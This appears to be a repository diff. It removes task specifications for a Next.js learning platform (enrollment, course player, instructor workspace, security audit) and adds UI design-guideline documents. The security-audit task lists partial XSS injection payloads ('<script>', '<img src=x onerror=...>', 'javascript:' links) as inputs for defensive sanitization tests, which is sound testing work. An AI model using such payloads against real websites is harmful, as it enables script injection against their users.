-170: - **Duplicate Enrollment**: Idempotent; if already enrolled, returns existing enrollment record gracefully without error.
-171: - **Lesson Not Found**: Throws `NotFoundError("Lesson does not exist")`.
-172: - **Unenrolled Access**: Throws `ForbiddenError("You must enroll in this course to access this lesson")`.
-173: 
-174: ---
-175: 
-176: ## UI / UX Requirements
-177: 
-178: - **Enrollment Button**: Clear call to action with loading state and immediate transition to "Enrolled".
-179: - **Lesson Completion Button**:
-180:   - "Mark as Complete" (with active press feedback `active:scale-[0.98]`).
-181:   - When completed: Checkmark icon with green accent styling and "Completed" state.
-182: - **Course Progress Bar**:
-183:   - Visual progress bar displaying current percentage (`XX% Complete`).
-184:   - Celebration visual when reaching 100% completion.
-185: 
-186: ---
-187: 
-188: ## Testing Strategy
-189: 
-190: - **Service Unit Tests** (`src/services/__tests__/enrollment.test.ts`, `progress.test.ts`):
-191:   - Test student enrollment in published course succeeds.
-192:   - Test student enrollment in draft course fails.
-193:   - Test duplicate enrollment is idempotent.
-194:   - Test marking lesson complete updates only the authenticated student's progress.
-195:   - Test progress percentage calculation:
-196:     - 0 of 4 lessons complete = 0%
-197:     - 2 of 4 lessons complete = 50%
-198:     - 4 of 4 lessons complete = 100% and sets `completedAt`.
-199:   - Test unmarking lesson complete correctly decrements percentage and clears `completedAt`.
-200:   - Test `getNextLesson()` correctly identifies the next uncompleted lesson in sequence.
-201: 
-202: ---
-203: 
-204: ## Documentation Updates
-205: 
-206: - Update `docs/reference/Entities.md` with `CourseEnrollment` and `LessonProgress` models.
-207: - Document progress calculation formulas in `docs/Architecture.md`.
-208: 
-209: ---
-210: 
-211: ## Acceptance Criteria
-212: 
-213: - [ ] Database migration applies `CourseEnrollment` and `LessonProgress` tables with unique compound indexes.
-214: - [ ] Students can enroll in published courses; enrollment in draft courses is blocked.
-215: - [ ] Marking lessons complete tracks per-user progress without any global data leakage.
-216: - [ ] Course completion percentage recalculates accurately on every progress change.
-217: - [ ] Reaching 100% completion records `completedAt` timestamp on the enrollment record.
-218: - [ ] Next lesson progression algorithm navigates sequentially through modules.
-219: - [ ] Unit test suite covers enrollment and progress calculations with 100% pass rate.
-220: - [ ] TypeScript check and lint pass with zero errors.
-221: 
-222: ---
-223: 
-224: ## Definition of Done
-225: 
-226: - [ ] Layered architecture adhered to: `UI → Actions → Services → Concrete Repositories → DB`.
-227: - [ ] Type-safe: Strict TypeScript, zero `any`.
-228: - [ ] Validated: Zod schemas validate courseId and lessonId inputs.
-229: - [ ] Authorized: Complete user progress isolation; unpublished course protection.
-230: - [ ] Tested: Unit tests verify calculation math, race conditions, and user isolation.
-231: - [ ] Invariant verified: Absolutely no global completion boolean on lesson entity.
-232: - [ ] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/06-course-catalog-player.md
-`````markdown
-  1: # Task 06: Course Catalog & Student Learning Player
-  2: 
-  3: ## Objective
-  4: 
-  5: Deliver the public course catalog with simple database filtering (`contains`), the comprehensive course syllabus preview, and the distraction-free student learning player—built with Server Components first, without separate search infrastructure or client query libraries.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Public course catalog page (`/courses`) with basic keyword filtering (Prisma `contains`), category filter, difficulty level filter, and pagination.
- 13: - Course overview and syllabus page (`/courses/[slug]`) displaying course metadata, instructor credentials, curriculum outline, and enrollment CTA.
- 14: - Distraction-free learning player layout (`/learn/[courseSlug]/[lessonSlug]`):
- 15:   - Collapsible curriculum outline sidebar with module accordions and visual completion checkmarks.
- 16:   - Focused content stage with responsive video embed or sanitized markdown/text reader.
- 17:   - Downloadable lesson attachments list.
- 18:   - Bottom navigation bar ("Previous Lesson", "Mark Complete & Next", "Next Lesson").
- 19: - Strict enrollment guard: verifies student enrollment before delivering non-preview lesson content.
- 20: 
- 21: ### Out of Scope
- 22: - External search engine integrations (Algolia, Meilisearch, or Elasticsearch). Basic database query filtering is sufficient.
- 23: - Social course reviews, 5-star rating systems, or student comment threads.
- 24: - TanStack / React Query client cache setups (Server Components handle data natively).
- 25: 
- 26: ---
- 27: 
- 28: ## Dependencies
- 29: 
- 30: - **Preceding Tasks**:
- 31:   - `Task 01`: Pagination schemas and action helpers.
- 32:   - `Task 02`: User/instructor profile display.
- 33:   - `Task 03`: Course, Module, and Lesson hierarchy.
- 34:   - `Task 04`: Sanitized lesson content and video embed normalizer.
- 35:   - `Task 05`: Enrollment access check and progress completion services.
- 36: - **Packages**:
- 37:   - `lucide-react`, `@prisma/client`, `zod`.
- 38: 
- 39: ---
- 40: 
- 41: ## Architecture Impact
- 42: 
- 43: ```
- 44: /courses and /courses/[slug] (Next.js 16 Server Components)
- 45:   ↓ directly calls
- 46: CourseService & CurriculumService (Server Component data fetch)
- 47:   ↓
- 48: Concrete Repositories → Database
- 49: 
- 50: /learn/[courseSlug]/[lessonSlug] (Server Component Layout & Page)
- 51:   ↓ verifies enrollment via EnrollmentService
- 52:   ↓ renders Server Component text content
- 53:   ↓ mounts Client Component Leaves for interactive player & sidebar:
- 54:       • PlayerSidebar (collapsible state, active highlights)
- 55:       • MarkCompleteButton (calls toggleLessonCompletionAction)
- 56:       • VideoEmbedPlayer (iframe mounting)
- 57: ```
- 58: 
- 59: ---
- 60: 
- 61: ## Data Model Impact
- 62: 
- 63: No new database models. Consumes existing `Course`, `Module`, `Lesson`, `LessonContent`, `CourseEnrollment`, and `LessonProgress`.
- 64: 
- 65: ---
- 66: 
- 67: ## Authorization Rules
- 68: 
- 69: ```
- 70: ┌────────────────────────────────────────────────────────┐
- 71: │ 1. Catalog & Syllabus Access                           │
- 72: │    Publicly viewable by unauthenticated visitors and   │
- 73: │    students. Queries strictly filter status=PUBLISHED. │
- 74: └──────────────────────────┬─────────────────────────────┘
- 75:                            │
- 76:                            ▼
- 77: ┌────────────────────────────────────────────────────────┐
- 78: │ 2. Free Preview Lesson Access                          │
- 79: │    Lessons with isFreePreview=true are viewable in the │
- 80: │    player by any user, even if unenrolled.             │
- 81: └──────────────────────────┬─────────────────────────────┘
- 82:                            │
- 83:                            ▼
- 84: ┌────────────────────────────────────────────────────────┐
- 85: │ 3. Restricted Lesson Paywall / Enrollment Gate         │
- 86: │    If isFreePreview=false:                             │
- 87: │    • User must be authenticated (requireAuth()).       │
- 88: │    • User must have an ACTIVE CourseEnrollment, or be  │
- 89: │      the authoring instructor, or be an admin.         │
- 90: │    • If unauthorized: Redirects to /courses/[slug]     │
- 91: │      with enrollment prompt.                           │
- 92: └────────────────────────────────────────────────────────┘
- 93: ```
- 94: 
- 95: ---
- 96: 
- 97: ## Validation
- 98: 
- 99: - **Catalog Query Schema** (`src/lib/validations/catalog.ts`):
-100:   ```typescript
-101:   export const catalogQuerySchema = z.object({
-102:     search: z.string().trim().max(100).optional(),
-103:     category: z.string().trim().max(50).optional(),
-104:     level: z.enum(["BEGINNER", "INTERMEDIATE", "ADVANCED", "ALL_LEVELS"]).optional(),
-105:     page: z.coerce.number().int().positive().default(1),
-106:     limit: z.coerce.number().int().positive().max(50).default(12),
-107:   });
-108:   export type CatalogQueryInput = z.infer<typeof catalogQuerySchema>;
-109:   ```
-110: 
-111: ---
-112: 
-113: ## Error Handling
-114: 
-115: - **Unenrolled Access**: Redirects to `/courses/[slug]` with an informational message indicating enrollment is required.
-116: - **Course or Lesson Not Found**: Renders standard Next.js `notFound()` (404) page.
-117: - **Unpublished Course Access**: Returns 404 for unauthenticated visitors and non-author students.
-118: 
-119: ---
-120: 
-121: ## UI / UX Requirements
-122: 
-123: - **Design Rules Compliance**:
-124:   - No em-dashes or en-dashes in visible copy.
-125:   - Interactive controls minimum 40x40px hit area.
-126:   - Active press feedback (`active:scale-[0.98]`).
-127:   - Dark mode protocol with consistent tokens from `globals.css`.
-128:   - Body text formatted with `max-w-[65ch]` and `text-wrap: pretty`.
-129:   - Headlines formatted with `text-wrap: balance`.
-130:   - `prefers-reduced-motion` honored on sidebar transitions and checkmark animations.
-131: - **Player Layout**:
-132:   - Header: Course title, progress bar, exit button.
-133:   - Sidebar: Module accordions with lesson items and completed checkmark icons.
-134:   - Canvas: Video player with 16:9 aspect ratio container or clean reading typography.
-135:   - Footer: Previous, Complete & Next, Next buttons.
-136: 
-137: ---
-138: 
-139: ## Testing Strategy
-140: 
-141: - **Integration Tests** (`src/app/(learning)/__tests__/learn-access.test.ts`):
-142:   - Test unenrolled student accessing restricted lesson is redirected to course page.
-143:   - Test unenrolled visitor accessing free preview lesson succeeds.
-144:   - Test enrolled student accessing lesson succeeds and returns content.
-145: - **Component Tests** (`src/components/learning/__tests__/player-sidebar.test.ts`):
-146:   - Test active lesson item is highlighted.
-147:   - Test completed lessons show green checkmark icon.
-148:   - Test sidebar toggle expands/collapses properly.
-149: - **Catalog Query Tests** (`src/repositories/__tests__/catalog.test.ts`):
-150:   - Test search filter queries title and description with `contains`.
-151:   - Test level and category filters accurately constrain results.
-152: 
-153: ---
-154: 
-155: ## Documentation Updates
-156: 
-157: - Update `docs/Features/Course-Player.md` with route structures and player component hierarchy.
-158: - Document catalog URL query parameter contracts.
-159: 
-160: ---
-161: 
-162: ## Acceptance Criteria
-163: 
-164: - [x] Catalog page renders published courses with simple database filtering (search, category, level).
-165: - [x] Course detail page displays curriculum outline and instructor credentials.
-166: - [x] Unenrolled students are blocked from reading non-preview lesson content.
-167: - [x] Enrolled students can navigate seamlessly between lessons in the player.
-168: - [x] Clicking "Mark as Complete & Next" records progress and advances to the next lesson.
-169: - [x] Responsive drawer allows mobile students to access curriculum outline.
-170: - [x] Design rules verified (40px hit targets, no em-dashes, press feedback).
-171: - [x] TypeScript check and lint pass with zero errors.
-172: 
-173: ---
-174: 
-175: ## Definition of Done
-176: 
-177: - [x] Implemented with Server Components first; no unnecessary client bundle overhead.
-178: - [x] Type-safe: Strict TypeScript, zero `any`.
-179: - [x] Validated: Zod parses and sanitizes catalog query parameters.
-180: - [x] Authorized: Enrollment gate strictly prevents unauthorized content access.
-181: - [x] Tested: Component and access gate integration tests pass.
-182: - [x] Design verified: All design rules and accessibility checks satisfied.
-183: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-`````
-
-## File: docs/tasks/07-instructor-dashboard.md
-`````markdown
-  1: # Task 07: Instructor Course Management Workspace
-  2: 
-  3: ## Objective
-  4: 
-  5: Provide instructors with a dedicated, secure management workspace to create courses, configure metadata, organize modules and lessons via an interactive curriculum builder with reordering controls, manage publishing lifecycles, and inspect student enrollment rosters—enforcing strict individual instructor resource ownership without invented tenancy or organization concepts.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - Protected instructor routes under `/instructor/*` with Server Component role guards.
- 13: - **My Courses Dashboard** (`/instructor/courses`): list of authored courses with status badges (`DRAFT`, `PUBLISHED`, `ARCHIVED`), student counts, and quick actions.
- 14: - **Course Creation & Settings** (`/instructor/courses/new`, `/instructor/courses/[courseId]/settings`): title, slug, description, category, level, and cover image URL.
- 15: - **Curriculum Builder** (`/instructor/courses/[courseId]/curriculum`):
- 16:   - Module management (add, rename, delete, reorder).
- 17:   - Lesson management (add, rename, toggle free preview, delete, reorder).
- 18:   - Direct navigation into lesson content editor.
- 19: - **Course Publishing Controls**: Publish / Unpublish action with validation enforcing that courses have at least one module and one lesson.
- 20: - **Student Roster & Insights** (`/instructor/courses/[courseId]/students`): view of enrolled students, enrollment dates, and individual progress percentages.
- 21: 
- 22: ### Out of Scope
- 23: - Tenant, Organization, or Workspace infrastructure (the platform operates on direct individual user resource ownership).
- 24: - Multi-instructor co-authoring or collaborative course permissions.
- 25: - Financial revenue charts or payment payouts.
- 26: - Video transcoding queues.
- 27: 
- 28: ---
- 29: 
- 30: ## Dependencies
- 31: 
- 32: - **Preceding Tasks**:
- 33:   - `Task 01`: `ActionResult<T>` and auth/role helpers.
- 34:   - `Task 02`: User identity with instructor role check.
- 35:   - `Task 03`: Course and curriculum domain models and services.
- 36:   - `Task 04`: Lesson content authoring.
- 37:   - `Task 05`: Enrollment and progress services.
- 38: - **Packages**:
- 39:   - `lucide-react`, `react-hook-form`, `zod`, `@prisma/client`.
- 40: 
- 41: ---
- 42: 
- 43: ## Architecture Impact
- 44: 
- 45: ```
- 46: /instructor/* (Server Components with Role Guard)
- 47:   ↓ verifies session has 'instructor' or 'admin' role
- 48:   ↓ queries courses strictly filtered by instructorId === session.userId
- 49:   ↓
- 50: Curriculum Builder (Client Component leaf for reordering & interactive state)
- 51:   ↓ calls
- 52: reorderCurriculumAction, publishCourseAction, updateCourseAction
- 53:   ↓
- 54: Services (CourseService, CurriculumService)
- 55:   ↓ Asserts course.instructorId === session.userId on every write
- 56: Concrete Repositories → Database
- 57: ```
- 58: 
- 59: ---
- 60: 
- 61: ## Data Model Impact
- 62: 
- 63: No new database models. Consumes `Course`, `Module`, `Lesson`, `CourseEnrollment`, and `User`.
- 64: 
- 65: ---
- 66: 
- 67: ## Authorization Rules
- 68: 
- 69: ```
- 70: ┌────────────────────────────────────────────────────────┐
- 71: │ 1. Authentication & Role Check                         │
- 72: │    requireRole("instructor") enforces that user has    │
- 73: │    instructor or admin privileges.                     │
- 74: │    Students attempting access receive 403 Forbidden.   │
- 75: └──────────────────────────┬─────────────────────────────┘
- 76:                            │
- 77:                            ▼
- 78: ┌────────────────────────────────────────────────────────┐
- 79: │ 2. Resource Ownership Enforcement                      │
- 80: │    All instructor queries and mutations are scoped to: │
- 81: │    where: { instructorId: session.userId }             │
- 82: │    Instructor A CANNOT view, edit, or delete           │
- 83: │    Instructor B's courses or curriculum!               │
- 84: └──────────────────────────┬─────────────────────────────┘
- 85:                            │
- 86:                            ▼
- 87: ┌────────────────────────────────────────────────────────┐
- 88: │ 3. Student Roster Privacy                              │
- 89: │    Student rosters can ONLY be viewed by the course's  │
- 90: │    authoring instructor or an admin.                   │
- 91: └──────────────────────────┬─────────────────────────────┘
- 92:                            │
- 93:                            ▼
- 94: ┌────────────────────────────────────────────────────────┐
- 95: │ 4. Course State Integrity                              │
- 96: │    Course cannot be set to PUBLISHED unless it has:    │
- 97: │    • At least 1 module                                 │
- 98: │    • At least 1 lesson                                 │
- 99: └────────────────────────────────────────────────────────┘
-100: ```
-101: 
-102: ---
-103: 
-104: ## Validation
-105: 
-106: - **Course & Curriculum Actions** validated via schemas from Task 03 (`createCourseSchema`, `createModuleSchema`, `createLessonSchema`, `reorderCurriculumSchema`).
-107: - **Publishing Action**:
-108:   ```typescript
-109:   export const publishCourseSchema = z.object({
-110:     courseId: z.string().cuid(),
-111:     publish: z.boolean(),
-112:   });
-113:   export type PublishCourseInput = z.infer<typeof publishCourseSchema>;
-114:   ```
-115: 
-116: ---
-117: 
-118: ## Error Handling
-119: 
-120: - **Forbidden Access**: Non-instructors attempting to access `/instructor` receive a 403 Forbidden page.
-121: - **Cross-Instructor Modification**: Throws `ForbiddenError("You are not authorized to modify this course")`.
-122: - **Premature Publishing**: Returns `ValidationError("A course must have at least one module and one lesson before publishing")`.
-123: 
-124: ---
-125: 
-126: ## UI / UX Requirements
-127: 
-128: - **Design Rules Compliance**:
-129:   - Touch targets minimum 40x40px on all buttons and inputs.
-130:   - Active press feedback (`active:scale-[0.98]`).
-131:   - No em-dashes or en-dashes in UI copy.
-132:   - Clear visual badges for course status:
-133:     - Draft: Muted yellow badge
-134:     - Published: Emerald green badge
-135:     - Archived: Muted slate badge
-136: - **Curriculum Builder UX**:
-137:   - Accessible reordering: Up/Down arrow buttons for keyboard and screen-reader accessibility, alongside drag handles.
-138:   - Inline editing for module and lesson titles with Enter to save, Escape to cancel.
-139:   - Instant toggle switch for "Free Preview" status.
-140: 
-141: ---
-142: 
-143: ## Testing Strategy
-144: 
-145: - **Guard Integration Tests** (`src/app/(dashboard)/instructor/__tests__/guard.test.ts`):
-146:   - Test student user accessing `/instructor/courses` receives 403 Forbidden.
-147:   - Test instructor user accessing `/instructor/courses` receives 200 OK.
-148: - **Ownership Isolation Tests** (`src/services/__tests__/instructor-ownership.test.ts`):
-149:   - Test Instructor A cannot fetch or mutate courses belonging to Instructor B.
-150:   - Test student roster queries reject unauthorized instructors.
-151: - **Component Tests** (`src/components/instructor/__tests__/curriculum-builder.test.ts`):
-152:   - Test adding a module immediately updates UI outline.
-153:   - Test reordering items triggers reorder action with correct ID array.
-154:   - Test publishing button displays validation warning if curriculum is empty.
-155: 
-156: ---
-157: 
-158: ## Documentation Updates
-159: 
-160: - Update `docs/Features/Instructor-Workspace.md` with route layout and curriculum builder specifications.
-161: - Document instructor role requirements in `docs/Authentication.md`.
-162: 
-163: ---
-164: 
-165: ## Acceptance Criteria
-166: 
-167: - [x] `/instructor/*` routes are protected by instructor role check.
-168: - [x] Instructors can view only their own authored courses.
-169: - [x] Instructors can create, edit, and archive courses.
-170: - [x] Curriculum builder supports adding, editing, and reordering modules and lessons.
-171: - [x] Publishing validation blocks publishing empty courses.
-172: - [x] Instructors can inspect the student enrollment roster and progress percentages.
-173: - [x] Cross-instructor modification attempts are rejected with 403 Forbidden.
-174: - [x] TypeScript check and lint pass with zero errors.
-175: 
-176: ---
-177: 
-178: ## Definition of Done
-179: 
-180: - [x] Layered architecture adhered to: `UI → Actions → Services → Concrete Repositories → DB`.
-181: - [x] Type-safe: Strict TypeScript, zero `any`.
-182: - [x] Validated: All mutations validated with Zod schemas.
-183: - [x] Authorized: Complete instructor resource ownership; roster privacy enforced.
-184: - [x] Tested: Route guard, ownership isolation, and curriculum builder tests pass.
-185: - [x] Accessible: Reordering accessible via keyboard up/down controls.
-186: - [x] Clean quality gate: Passes lint, typecheck, and test checks.
-187: - [x] Documented: Updated feature and authentication documentation.
-`````
-
-## File: docs/tasks/08-qa-security-documentation.md
-`````markdown
-  1: # Task 08: Final QA, Security Audit & Documentation
-  2: 
-  3: ## Objective
-  4: 
-  5: Execute the final holistic verification phase across the entire LMS platform: validating that per-feature security and tests function in concert across the integrated system, conducting an end-to-end security audit (IDOR, CSRF, XSS), verifying database indexes and build performance, and synchronizing project architecture documentation and ADRs.
-  6: 
-  7: ---
-  8: 
-  9: ## Scope
- 10: 
- 11: ### In Scope
- 12: - **Holistic Test Suite Execution**: Running all unit, integration, and component tests across the repository (`pnpm test`) to guarantee zero regressions.
- 13: - **Security Audit & Verification**:
- 14:   - Verification of multi-tier authorization across all Server Actions and route handlers.
- 15:   - Automated IDOR penetration tests (verifying cross-instructor and cross-student resource isolation).
- 16:   - CSRF header and origin validation check.
- 17:   - Server-side HTML sanitization audit on lesson content.
- 18: - **Performance & Database Audit**:
- 19:   - Database index verification in `prisma/schema.prisma` ensuring index coverage for foreign keys and queries.
- 20:   - Bundle size analysis: verifying Client Components are minimal leaves and Server Components handle heavy rendering.
- 21: - **Documentation & Architecture Synchronization**:
- 22:   - Creating `docs/decisions/004-lms-domain-model.md`.
- 23:   - Updating `docs/Architecture.md` with active LMS services and repositories.
- 24:   - Updating `docs/reference/Entities.md` with domain models.
- 25:   - Updating `README.md` to document the completed LMS features.
- 26: 
- 27: ### Out of Scope
- 28: - Introducing new product features or speculative extensions.
- 29: - Modifying previously verified domain business logic unless a security or regression defect is identified.
- 30: 
- 31: ---
- 32: 
- 33: ## Dependencies
+ 29: - Labels associated with inputs.
+ 30: - Error messages linked to inputs via `aria-describedby`.
+ 31: - Required fields indicated visually and programmatically.
+ 32: - Inline validation on blur, not on every keystroke.
+ 33: - Never clear form state on accidental navigation.
  34: 
- 35: - **Preceding Tasks**: Tasks 01 through 07 must be implemented and feature-level tested before running this final verification phase.
+ 35: ---
  36: 
- 37: ---
+ 37: # Animation
  38: 
- 39: ## Architecture Impact
- 40: 
- 41: Confirms and locks down the completed layered architecture:
- 42: ```
- 43: UI (Clean Server Components, accessible Client leaves)
- 44:  ↓
- 45: Actions / Route Handlers (Standardized ActionResult<T>, Zod input parsing, auth guards)
- 46:  ↓
- 47: Services (Strict 4-tier authorization, business logic, transactions)
- 48:  ↓
- 49: Concrete Repositories (Concrete domain modules, clean Prisma mapping)
- 50:  ↓
- 51: Database (Neon PostgreSQL with verified indexes)
- 52: ```
+ 39: - Always honor `prefers-reduced-motion`.
+ 40: - Keep animations under 300ms for micro-interactions.
+ 41: - Use `ease-out` for enter, `ease-in` for exit.
+ 42: - Virtualize lists over 50 items.
+ 43: - Avoid layout-triggering animations (use `transform` and `opacity`).
+ 44: 
+ 45: ---
+ 46: 
+ 47: # Typography
+ 48: 
+ 49: - Use `text-wrap: balance` on headlines.
+ 50: - Use `text-wrap: pretty` on body text.
+ 51: - Line length: 45-90 characters.
+ 52: - Consistent type scale across the application.
  53: 
  54: ---
  55: 
- 56: ## Data Model Impact
+ 56: # Content
  57: 
- 58: No schema changes. Verifies index efficiency on existing models (`Course`, `Module`, `Lesson`, `LessonContent`, `CourseEnrollment`, `LessonProgress`).
- 59: 
- 60: ---
- 61: 
- 62: ## Authorization Rules
- 63: 
- 64: Audits the enforcement of the 4-tier authorization doctrine across all routes and Server Actions:
- 65: 1. **Authentication**: All protected endpoints require valid Better Auth sessions.
- 66: 2. **Role Authorization**: Privileged teaching endpoints require `instructor` or `admin` roles.
- 67: 3. **Resource Ownership**: No instructor can mutate another instructor's course; no student can mutate another student's progress.
- 68: 4. **Resource State**: Courses cannot be published without valid curriculum; draft courses cannot be enrolled.
- 69: 
- 70: ---
+ 58: - Use `Intl.DateTimeFormat` for dates.
+ 59: - Destructive actions need confirmation or undo.
+ 60: - URL should reflect application state.
+ 61: - Loading states for all async operations.
+ 62: 
+ 63: ---
+ 64: 
+ 65: # Images
+ 66: 
+ 67: - Explicit `width` and `height` on all images.
+ 68: - Use `next/image` for optimized delivery.
+ 69: - Alt text on all meaningful images.
+ 70: - Decorative images: `alt=""` and `role="presentation"`.
  71: 
- 72: ## Validation
+ 72: ---
  73: 
- 74: Verifies that all Server Actions parse inputs strictly through Zod schemas before reaching the Service layer, preventing unvalidated parameters from reaching business logic or database queries.
+ 74: # Performance
  75: 
- 76: ---
- 77: 
- 78: ## Error Handling
- 79: 
- 80: Verifies that no raw database errors or stack traces leak to the client; all exceptions are properly transformed into user-friendly `ActionResult<T>` responses and tracked in Sentry.
+ 76: - Server Components by default.
+ 77: - Lazy load below-the-fold content.
+ 78: - Minimize client-side JavaScript.
+ 79: - Use streaming and Suspense boundaries.
+ 80: - Prefetch critical navigation links.
  81: 
  82: ---
  83: 
- 84: ## UI / UX Requirements
+ 84: # Touch
  85: 
- 86: - Verify all interactive controls across catalog, player, and instructor workspace meet Design Rules (40x40px hit areas, press feedback, no em-dashes).
- 87: - Verify dark mode contrast ratios and `prefers-reduced-motion` adherence.
- 88: 
- 89: ---
+ 86: - Minimum 40x40px touch targets.
+ 87: - Avoid hover-only interactions on touch devices.
+ 88: - Use `@media (hover: hover)` for hover styles.
+ 89: - Safe areas for mobile notches.
  90: 
- 91: ## Testing Strategy
+ 91: ---
  92: 
- 93: 1. **IDOR Penetration Test Suite** (`src/__tests__/security/idor.test.ts`):
- 94:    - Simulated test matrix:
- 95:      - User A attempts to update User B's profile → asserts 403 Forbidden.
- 96:      - Instructor A attempts to update Instructor B's course → asserts 403 Forbidden.
- 97:      - Instructor A attempts to delete Instructor B's module/lesson → asserts 403 Forbidden.
- 98:      - Student A attempts to query or mutate Student B's progress → asserts 403 Forbidden.
- 99:      - Unenrolled student attempts to read restricted lesson content → asserts 403 Forbidden.
-100: 2. **XSS Sanitization Audit** (`src/__tests__/security/xss.test.ts`):
-101:    - Test injection payloads (`<script>`, `<img src=x onerror=...>`, `<a href="javascript:...">`, `<iframe>`) through `LessonContentService` and assert they are sanitized before storage or rendering.
-102: 3. **CSRF & Origin Verification**:
-103:    - Verify Better Auth CSRF token and Origin header checks reject cross-origin form submissions.
-104: 4. **Full Suite Execution**:
-105:    - `pnpm test`
-106:    - `pnpm typecheck`
-107:    - `pnpm lint`
-108: 
-109: ---
-110: 
-111: ## Documentation Updates
-112: 
-113: 1. **`docs/decisions/004-lms-domain-model.md`**:
-114:    - Title: Use Dedicated Curriculum, Enrollment, and Isolated Progress Models.
-115:    - Decision: Model Course → Module → Lesson with explicit `orderIndex`, explicit `CourseEnrollment`, and isolated `LessonProgress`.
-116:    - Status: Accepted.
-117: 2. **`docs/Architecture.md`**:
-118:    - Update layer diagrams and document service/repository responsibilities.
-119: 3. **`docs/reference/Entities.md`**:
-120:    - Document `Course`, `Module`, `Lesson`, `LessonContent`, `CourseEnrollment`, `LessonProgress`.
-121: 4. **`README.md`**:
-122:    - Synchronize with actual platform features, installation instructions, and testing commands.
-123: 
-124: ---
-125: 
-126: ## Acceptance Criteria
-127: 
-128: - [ ] All unit, integration, and security tests pass with 100% success rate.
-129: - [ ] Automated IDOR tests verify complete user, instructor, and student resource isolation.
-130: - [ ] XSS sanitization penetration tests pass.
-131: - [ ] Database indexes match all active query and ordering paths.
-132: - [ ] `docs/decisions/004-lms-domain-model.md` is created and approved.
-133: - [ ] Documentation accurately describes the final implemented state.
-134: 
-135: ---
-136: 
-137: ## Definition of Done
-138: 
-139: - [ ] Security audited: IDOR, XSS, and CSRF verified and passing.
-140: - [ ] Quality gate: `pnpm check` (biome, tsc, knip) passes cleanly.
-141: - [ ] Build successful: Next.js production build succeeds without warnings.
-142: - [ ] Test coverage: Comprehensive coverage across all services, actions, and UI components.
-143: - [ ] Documented: ADR 004 created, Architecture.md and README.md updated.
-144: - [ ] Zero technical debt: No dead code, no `any` types, no leftover console logs.
+ 93: # Dark Mode
+ 94: 
+ 95: - Use CSS custom properties for theme switching.
+ 96: - Test both light and dark modes.
+ 97: - Avoid pure black (#000) for backgrounds. Use dark grays.
+ 98: - Ensure sufficient contrast in both modes.
+ 99: 
+100: ---
+101: 
+102: # Sources
+103: 
+104: - Vercel web-interface-guidelines (MIT).
+105: - Vercel web-design-guidelines agent skill.
+106: - vercel.com/design/guidelines.
+`````
+
+## File: docs/skills/Impeccable Toolchain.md
+`````markdown
+ 1: # Impeccable Toolchain
+ 2: 
+ 3: Automated visual and engineering defect detection for AI-generated frontend code.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Overview
+ 8: 
+ 9: - 23 commands organized by discipline.
+10: - 45 deterministic anti-pattern rules.
+11: - Runs without an LLM for detection.
+12: - Live iteration mode for HMR-based design.
+13: 
+14: ---
+15: 
+16: # Installation
+17: 
+18: ```bash
+19: npx impeccable install
+20: ```
+21: 
+22: Then inside your AI coding tool:
+23: 
+24: ```
+25: /impeccable init
+26: ```
+27: 
+28: This creates `PRODUCT.md` and optionally `DESIGN.md`.
+29: 
+30: ---
+31: 
+32: # Key Commands
+33: 
+34: | Command                | Purpose                                          |
+35: | ---------------------- | ------------------------------------------------ |
+36: | `/impeccable init`     | Initialize project with PRODUCT.md and DESIGN.md |
+37: | `/impeccable detect`   | Run 45-rule detector                             |
+38: | `/impeccable bolder`   | Respect existing design systems                  |
+39: | `/impeccable critique` | Independent critique mode                        |
+40: 
+41: ---
+42: 
+43: # PRODUCT.md
+44: 
+45: Defines:
+46: 
+47: - Audience and user persona.
+48: - Brand/product lane.
+49: - Voice and tone.
+50: - Anti-references (what NOT to build).
+51: 
+52: ---
+53: 
+54: # DESIGN.md
+55: 
+56: Defines:
+57: 
+58: - Color palette (named hex values).
+59: - Typography scale.
+60: - Component inventory.
+61: - Aesthetic direction.
+62: 
+63: ---
+64: 
+65: # Named Anti-Slop Tells
+66: 
+67: Impeccable flags these patterns:
+68: 
+69: - Inter for everything without justification.
+70: - Purple-to-blue gradients.
+71: - Cards nested in cards.
+72: - Decorative grid backgrounds.
+73: - Two-axis gradient overlay patterns.
+74: 
+75: ---
+76: 
+77: # Detector Rules (45)
+78: 
+79: The detector runs deterministically without an LLM:
+80: 
+81: - Typography violations.
+82: - Color violations.
+83: - Layout violations.
+84: - Interaction violations.
+85: - Performance violations.
+86: - Accessibility violations.
+87: 
+88: ---
+89: 
+90: # Sources
+91: 
+92: - pbakaus/impeccable (Apache-2.0).
+93: - impeccable.style.
+94: - Latest: skill-v3.9.1, cli-v3.2.0 (2026-07-01).
+`````
+
+## File: docs/skills/Make Interfaces Feel Better.md
+`````markdown
+ 1: # Make Interfaces Feel Better
+ 2: 
+ 3: Micro-interaction and visual polish skill by Jakub Krehel.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Overview
+ 8: 
+ 9: 16 rule categories for improving interface feel through precise micro-interactions, shadows, typography, and animation values.
+10: 
+11: ---
+12: 
+13: # Key Rules
+14: 
+15: ## Concentric Border Radius
+16: 
+17: Outer radius = inner radius + padding.
+18: 
+19: Example: card with 16px padding and 8px inner radius gets 24px outer radius.
+20: 
+21: ## Optical Alignment
+22: 
+23: Elements should appear visually centered, not mathematically centered.
+24: 
+25: Adjust for optical weight (heavier elements shift slightly toward center).
+26: 
+27: ## Shadows Over Borders
+28: 
+29: Compose shadows from three layers:
+30: 
+31: 1. Ambient (diffuse, large spread).
+32: 2. Key (directional, medium spread).
+33: 3. Rim (tight, small spread).
+34: 
+35: Prefer shadows over borders for depth and separation.
+36: 
+37: ## Press States
+38: 
+39: Button press feedback: `transform: scale(0.96)`.
+40: 
+41: Never go below `scale(0.95)`.
+42: 
+43: ## Hit Areas
+44: 
+45: Interactive elements: minimum 40x40px hit area.
+46: 
+47: Extend with pseudo-element when the visible element is smaller.
+48: 
+49: ## Font Smoothing
+50: 
+51: Enable: `-webkit-font-smoothing: antialiased`.
+52: 
+53: Use `font-variant-numeric: tabular-nums` for numeric data.
+54: 
+55: ## Animation Values
+56: 
+57: - Icon: `scale 0.25 -> 1`, `opacity 0 -> 1`, `blur 4px -> 0`.
+58: - Stagger delay: ~100ms between items.
+59: - Enter duration: ~800ms.
+60: - Exit: subtler than enter.
+61: - Spring settings: `duration 0.3`, `bounce 0`.
+62: 
